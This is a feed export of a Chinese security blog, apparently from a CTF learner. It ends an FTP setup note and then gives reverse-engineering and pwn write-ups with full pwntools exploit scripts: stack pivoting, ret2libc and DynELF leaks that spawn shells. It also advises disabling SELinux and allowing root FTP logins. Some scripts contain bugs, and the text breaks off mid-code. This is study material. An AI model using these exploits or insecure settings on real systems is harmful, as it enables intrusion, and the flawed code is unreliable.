title="SELinux服务："></a>SELinux服务：</h4><p><code>setsebool -P ftpd_full_access=on</code>单独处理ftpd。</p><p>或：关闭SELinux</p><pre><code class="html">$ vi /etc/selinux/config</code></pre><p>将 SELINUX=XXX –&gt;XXX 代表级别<br>改为** SELINUX=disabled**<br>然后重启系统，或者执行命令：<code>setenforce 0</code>。</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2:"></a>0x2:</h3><p>发现匿名用户，在连上ftp服务器时候，无法进行写入东西。</p><pre><code class="html">550 Permission denied.</code></pre><p>然后这个目录是:</p><pre><code class="html">/var/ftp/pub</code></pre><p>这就是把这个pub的属主控制为 控制为ftp即可。</p><pre><code class="html">chown ftp pub</code></pre><p>这样就可以了。</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3:"></a>0x3:</h3><p>在本地用户的时候，用root也是无法连接ftp服务的。这是因为vsftpd服务程序所在的目录中默认存放着两个名为“用户名单”的文件（<code>ftpusers和user_list</code>）把ftpusers这里面的root去掉即可。</p><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4:"></a>0x4:</h3><ul><li>在采用本地用户模式登录FTP服务器后，默认访问的是该用户的家目录，也就是说，访问的是/home/linuxprobe目录(系统创建的用户，在home文件夹下都有对应用户名的文件夹)。而且该目录的默认所有者、所属组都是该用户自己，因此不存在写入权限不足的情况。如果读写权限没给，手动设定，给读写权限。</li><li>采用非本地用户模式登录，与采用本地用户模式的区别是：采用非本地用户模式<strong>可以指定FTP文件夹</strong>。<br>￼￼￼￼￼￼￼</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安恒抗疫赛</title>
    <link href="/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <url>/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="安恒抗疫赛"><a href="#安恒抗疫赛" class="headerlink" title="安恒抗疫赛"></a>安恒抗疫赛</h1><p>很简单的比赛，题也不多，记录一下做的2道简单的Re。</p><h2 id="re1-pyc"><a href="#re1-pyc" class="headerlink" title="re1_pyc"></a>re1_pyc</h2><p>拿到的是一个pyc文件。直接拿到网站上反编译一下：</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) - 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    for i in range(len(flag)):        j = i % 3        if j == 0:            p1 += flag[i]            continue        if j == 1:            p2 += flag[i]            continue        p3 += flag[i]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)while True:    flag = raw_input(&#39;please input flag to check:&#39;)    if rep(base64.b64encode(rail(caser(flag)))) == &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;:        print &#39;Success!you got it!&#39;        break        continue    print &#39;try a gain&#39;</code></pre><p>逻辑挺简单的，直接拿着这个代码改下：</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) + 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    j = 0    x = 25    for i in range(x):        j = i + 13        z = j + 13        p3 += flag[i] + flag[j]         if z &gt;= 38 :            break        p3 += flag[z]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)key = &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;flag = rail(caser(base64.b64decode(rep(key) + &#39;=&#39;)))print(flag)</code></pre><h2 id="maze1"><a href="#maze1" class="headerlink" title="maze1"></a>maze1</h2><p>一个简单的maze问题，不过是c++写的，ida反编译看起来有点难读。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/03LBOC.png" srcset="/img/loading.gif" alt><br>从这里确定下地图，后面的2就是终点。去内存中取出来地图：<br><img src="http://qiqianyun.chumen77.xyz/uPic/x7t4PS.png" srcset="/img/loading.gif" alt><br>去ida继续分析：<br><img src="http://qiqianyun.chumen77.xyz/uPic/S2wojN.png" srcset="/img/loading.gif" alt><br>发现你输入的字符串需要等于10，如果不是直接就失败，长度等于10才继续判断。awsd还是这几个字符控制方向。再联系一下前面的地图，终点是2，只能走10步，猜一波dddddsssss。<br><img src="http://qiqianyun.chumen77.xyz/uPic/3qNEI0.png" srcset="/img/loading.gif" alt><br>就是这个，flag就是去md5加密一下出来的字符串。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录i春秋新春公益赛的两个题</title>
    <link href="/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/"/>
    <url>/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="记录i春秋新春公益赛的两个题"><a href="#记录i春秋新春公益赛的两个题" class="headerlink" title="记录i春秋新春公益赛的两个题"></a>记录i春秋新春公益赛的两个题</h1><h2 id="吃鸡神器"><a href="#吃鸡神器" class="headerlink" title="吃鸡神器"></a>吃鸡神器</h2><p>这个题目是比赛时没做，因为有一段时间没做re题目了，下来看到这个题做出的人不算少，就去尝试做一做。<br>源程序是qt写的，以前听室友说过qt的程序ida是静态分析不了的，函数调用太多了，就直接动态分析。这个题目应该是有多线程od打开直接是黑屏的，左下角显示新建了一个线程，第一次做这种题也比较没有头绪。折腾了一会发现用的<strong>x64dbg</strong>可以调试了。</p><h3 id="x64dbg调试"><a href="#x64dbg调试" class="headerlink" title="x64dbg调试"></a>x64dbg调试</h3><p>一直运行程序等代码跑到0x40开头的段，进入login 的模块。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aQ0jsg.png" srcset="/img/loading.gif" alt><br>找下字符串：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/AL01Oy.png" srcset="/img/loading.gif" alt><br>在这里下个断点。因为登陆失败会跳转输出这个字符串的函数，看看能不能查看出是从哪里跳转过来的然后在密码判断那里来继续分析。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Ior8oA.png" srcset="/img/loading.gif" alt><br>看到已经跳转过来了，但是发现附近没有什么判断的地方，去根据那个从哪里跳转过来，追过去看到登陆成功调用welcome的函数，但是也没有发现什么可以利用的那里的判断不是要找的密码判断。<br>换个思路，还是跳转到失败那里，但是在<strong>上层函数</strong>的栈中，因为存在判断登陆的用户跟密码，应该会存在我们输入的东西，寻找一下密码跟用户名。<br><img src="http://qiqianyun.chumen77.xyz/uPic/ExvIk2.png" srcset="/img/loading.gif" alt><br>找到了，给用户名对应的地址下一个硬件断点，来看看哪里会访问这里，只要访问了基本距离要找的函数差不远了。其中第二个字符对应处，经测试不应该下断点。一直让其F9运行，等到了用户0x40段代码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/guzN1A.png" srcset="/img/loading.gif" alt><br>发现这段是在一个个字符处理<strong>lubenwei</strong>字符串，还有<code>ret</code>，这样基本就是了。ret以后到：<br><img src="http://qiqianyun.chumen77.xyz/uPic/nTZ8tn.png" srcset="/img/loading.gif" alt><br>注意此处的汇编语句，并看下寄存器情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bua46M.png" srcset="/img/loading.gif" alt><br>刚刚走过call函数，下面且有cmp对比语句，并且发现了输入的密码<code>12345678</code>，十分可疑了。<br>在这几处函数下断点，重新点击login验证进行分析，发现的确断在了下的这几个函数，结合寄存器查看发现，输入的密码跟走过<code>0x004021D3</code>这个函数后传过来的eax进行对比。并且一对比以后就进入了，提示登陆失败的地方。所以这个eax就是用户的密码了。<br>测试以后发现是小写的<code>eax  41D26F00</code> ：41d26f00,输入密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/psY0ix.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r3WZrp.png" srcset="/img/loading.gif" alt><br>Ok,成功了。</p><h2 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h2><p>这个题目名字就是borrowshack 接栈。含义就是转移栈，正好最近刚学过，就动手去做了，结果卡了很久，但也学到很多，此前练习的栈迁移题目没有这题的情况。</p><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">[*] &#39;/media/psf/mypwn2/xcgys/borrowstack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-60h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  puts(&amp;s);  read(0, &amp;buf, 0x70uLL);  puts(&quot;Done!You can check and use your borrow stack now!&quot;);  read(0, &amp;bank, 0x100uLL);  return 0;}</code></pre><p>代码是很简单的，bank的地址在bss段，以后留着做栈迁移就可以了 。溢出地址还是只可以控制ebp，跟retadress。接下来就是自己学到的了，自己手动调试了一段时间才发现的。</p><h4 id="坑点（学到的新东西）"><a href="#坑点（学到的新东西）" class="headerlink" title="坑点（学到的新东西）"></a>坑点（学到的新东西）</h4><p>先说下这个程序的情况：<br>bank 的地址 <code>.bss:0000000000601080</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/Q3hjpz.png" srcset="/img/loading.gif" alt><br>注意看下bss段里got段的距离，一共是40个字节，是比较近的。如果按我以前的做法直接迁移到bank这地址做新栈，当栈迁移过去以后，使用puts函数来泄露某个函数got对应的地址时，会发现当调用puts以后，会进入libc中开始一连串的函数调用：第一个<br><img src="http://qiqianyun.chumen77.xyz/uPic/2Zk09z.png" srcset="/img/loading.gif" alt><br>发现还没有push，此时rsp就是bank的地址了，push过后肯定栈指针开始慢慢变小，往bss段上方延伸。<br>当调用第二个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/v02DA7.png" srcset="/img/loading.gif" alt><br>发现已经到了bss上方的got表段，这样毫无疑问，里面的值就会改动了，程序接下来发生什么是很难预测的，并且个人也拿不到原本的got地址，从而算出libc基地址。并且会发现，当以往回到start处清理栈想再次利用漏洞的时候，也是不行了，也是因为不知道什么数据被改动，造成了影响。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>就是把栈迁移到bss段的尽量靠后，这样就会尽量不影响到got表和原本正常的数据。返回地址不再是自己常常用的start处，换成其他合适的地方。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./borrowstack&#39;)# io = remote(&#39;123.56.85.29&#39;,3635)elf = ELF(&#39;./borrowstack&#39;)# libc = elf.libcleave_addr = 0x0400699offset = 200buf_addr = 0x000601080padding = 0x60start_addr = 0x0400626p = &#39;\x00&#39;* padding + p64(buf_addr+offset) + p64(leave_addr)pop_rsi_rx_ret = 0x400701 io.recvuntil(&#39;want\n&#39;)raw_input(&#39;-&gt;&#39;)io.send(p)io.recvuntil(&#39;stack now!\n&#39;)libc_start_main =  elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]pop_rdi_ret = 0x400703read_got = elf.got[&#39;read&#39;]p = flat([&#39;b&#39;*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr])raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))print(hex(puts_add))obj = LibcSearcher(&#39;puts&#39;,puts_add)libc_base = puts_add - obj.dump(&#39;puts&#39;)print(hex(libc_base))sleep(0.1)rec = libc_base + 0x4526asystem_addr = libc_base + libc_basebinsh_addr = libc_base + libc_baseprint(hex(system_addr))print(hex(binsh_addr))io.recvline()io.recvuntil(&#39;want\n&#39;)p = &#39;\x00&#39;* padding + p64(1) + p64(rec)io.send(p)io.interactive()</code></pre><h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3><p>结论：当栈迁移到bss段以后，由于libc函数的调用，此时栈慢慢增高，bss段以上的数据也可能会被改动。<br>收获：当再遇到栈迁移问题的时候，要注意bss段与got的距离，返回地址写入start地址，发现出现问题的时候，就该提升栈迁移的地址高度，和找个合适的返回位置，再次利用漏洞。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_pwn新手</title>
    <link href="/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/"/>
    <url>/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-pwn新手"><a href="#XCTF-pwn新手" class="headerlink" title="XCTF_pwn新手"></a>XCTF_pwn新手</h1><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/17/XCTF_pwn新手/images/15819436335898.jpg" srcset="/img/loading.gif" alt="-w605"><br>漏洞就在这s处，gets可以无限读取，导致栈溢出。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>第一个fgets获取时候，读取一个<code>/bin/sh\x00</code>进去，因为name的地址是固定的。</li><li>get函数获取时候，padding + system_plt +name地址即可。</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./cgpwn2&#39;)io = remote(&#39;111.198.29.45&#39;,40540)elf = ELF(&#39;./cgpwn2&#39;)io.recvuntil(&#39;name\n&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(&#39;/bin/sh\x00&#39;)system_plt = elf.symbols[&#39;system&#39;]padding = 0x26 + 4binsh_add = 0x0804A080payload = padding * &#39;a&#39; + p32(system_plt) + p32(0x0804A080) + p32(binsh_add)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用DynElf模块完成获取libc信息</title>
    <link href="/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/"/>
    <url>/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="利用DynElf模块完成获取libc信息"><a href="#利用DynElf模块完成获取libc信息" class="headerlink" title="利用DynElf模块完成获取libc信息"></a>利用DynElf模块完成获取libc信息</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。</p><h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释）</p><h3 id="基本使用框架："><a href="#基本使用框架：" class="headerlink" title="基本使用框架："></a>基本使用框架：</h3><pre><code>io = remote(ip, port)def leak(addr):    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;    io.send(payload)    data = io.recv()    #debug用的    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data#初始化DynELF模块 d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)system_addr = d.lookup(“system”, &#39;libc&#39;)</code></pre><p>其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。<strong>正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols</strong>。</p><p>且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。</p><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p><ul><li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</li><li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</li></ul><p>以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p><h3 id="使用write函数来泄露"><a href="#使用write函数来泄露" class="headerlink" title="使用write函数来泄露"></a>使用write函数来泄露</h3><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p><p>其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。</p><h4 id="万能gadget"><a href="#万能gadget" class="headerlink" title="万能gadget"></a>万能gadget</h4><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg" srcset="/img/loading.gif" alt="-w817"><br>这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的<code>pop rbx</code>的地址，然后看下栈如何来布置：<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817631112375.jpg" srcset="/img/loading.gif" alt="-w486"><br>（其中为什么填入got地址，是因为接下来ret到<code>mov rdx,r13</code>后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）<br>在第一段pop 后ret地址要填入<code>mov rdx,r13</code>的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817633402017.jpg" srcset="/img/loading.gif" alt="-w259"><br>所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。</p><h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>   Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>ssize_t sub_80483F4(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *io = process(&#39;./ropasaurusrex&#39;)elf = ELF(&#39;./ropasaurusrex&#39;)buf = 0x8049620padding = 140write_add = elf.symbols[&#39;write&#39;]start_addr = 0x08048340def leak(addr):    p = &#39;&#39;    p += padding * &#39;a&#39;    p += p32(write_add)    p += p32(start_addr)    p += p32(1)    p += p32(addr)    p += p32(0x4)    io.sendline(p)    content = io.recv(4)    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak,elf=elf)system_add = d.lookup(&#39;system&#39;,&#39;libc&#39;)read_add = d.lookup(&#39;read&#39;,&#39;libc&#39;)log.info(&quot;system_add = %x&quot;, system_add)log.info(&quot;read_add = %x&quot;, read_add)p = padding * &#39;a&#39; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)io.sendline(p)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/jarvis_OJ/level4/level4&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817716059093.jpg" srcset="/img/loading.gif" alt="-w420"></p><pre><code>ssize_t vulnerable_function(){  char buf; // [esp+0h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>漏洞函数，存在栈溢出。还是跟上题一样的思路。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *import time# context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./level4&#39;)io = remote(&#39;pwn2.jarvisoj.com&#39;,9880)elf = ELF(&#39;./level4&#39;)__libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]start_addr = 0x08048350padding = 140def leak(addr):    payload = padding * &#39;a&#39; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)    io.sendline(payload)    data = io.recv(4)    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)info(&#39;system_addr = %#x&#39; %system_addr)read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;)info(&#39;read_addr = %#x&#39; %read_addr)binsh_add = 0x804A01Cpayload = padding * &#39;a&#39; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="使用puts函数来泄露"><a href="#使用puts函数来泄露" class="headerlink" title="使用puts函数来泄露"></a>使用puts函数来泄露</h3><p>printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，<strong>puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点</strong>，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p><h4 id="针对缺点的改进办法"><a href="#针对缺点的改进办法" class="headerlink" title="针对缺点的改进办法"></a>针对缺点的改进办法</h4><h5 id="puts输出完后就没有其他输出"><a href="#puts输出完后就没有其他输出" class="headerlink" title="puts输出完后就没有其他输出"></a>puts输出完后就没有其他输出</h5><p>leak函数模板<br>    def leak(address):<br>      count = 0<br>      content = ‘’<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出<br>      up = “”<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == ‘\n’ and c == “”:  #接收到的上一个字符为回车符，而当前接收不到新字符，则<br>         content += content[:-1]  +’\x00’            #删除puts函数输出的末尾回车符<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #取指定字节数<br>      log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’)))<br>      return content<br>其中<code>c = p.recv(numb=1, timeout=0.1)</code>由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</p><h5 id="puts输出完后还有其他输出"><a href="#puts输出完后还有其他输出" class="headerlink" title="puts输出完后还有其他输出"></a>puts输出完后还有其他输出</h5><pre><code>def leak(address):  count = 0  content = &quot;&quot;  payload = xxx  p.send(payload)  print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出  up = &quot;&quot;  while True:    c = p.recv(1)    count += 1    if up == &#39;\n&#39; and c == &quot;x&quot;:  #一定要找到泄漏信息的字符串特征      content = content[:-1] + &quot;x00&quot;                        break    else:      content += c    up = c  content = content[:4]   log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &#39;&#39;).encode(&#39;hex&#39;)))  return content</code></pre><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>int sub_40068E(){  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);}__int64 __fastcall sub_40063D(__int64 a1, signed int a2){  __int64 result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    result = (unsigned int)i;    if ( i &gt;= a2 )      break;    read(0, (void *)(i + a1), 1uLL);  }  return result;}</code></pre><p>主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。</p><ol><li>因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。</li><li>第二次构造rop链的时候，用read函数读<code>system(/bin/sh)</code>到一个确定的地址，还是会到start处。</li><li>第三次构造时候，直接进行调用system函数的rop链即可。</li></ol><p>其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817725422726.jpg" srcset="/img/loading.gif" alt="-w820"></p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code>#coding:utf-8from pwn import *context.arch = &#39;amd64&#39;# context.log_level = &#39;info&#39;io = process(&#39;./pwn100&#39;)elf = ELF(&#39;./pwn100&#39;)# libc = elf.libcpadding = 72puts_plt = elf.plt[&#39;puts&#39;]read_got = elf.got[&#39;read&#39;]start_add = 0x000400550pop_rdi = 0x400763def leak(addr):    payload = padding * &#39;a&#39; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]    payload = payload.ljust(200,&#39;b&#39;)    io.send(payload)    count = 0    up = &#39;&#39;    content = &#39;&#39;    io.recvuntil(&#39;bye~\n&#39;) #一定要在puts前释放完输出    while True:        c = io.recv(numb=1, timeout=0.1)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:  #接收到的上一个字符为回车符，而当前接收不到新字符，则            content = content[:-1]  +&#39;\x00&#39;             #删除puts函数输出的末尾回车符            break            content += c        else:            up = c    content = content[:4]  #取指定字节数    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content 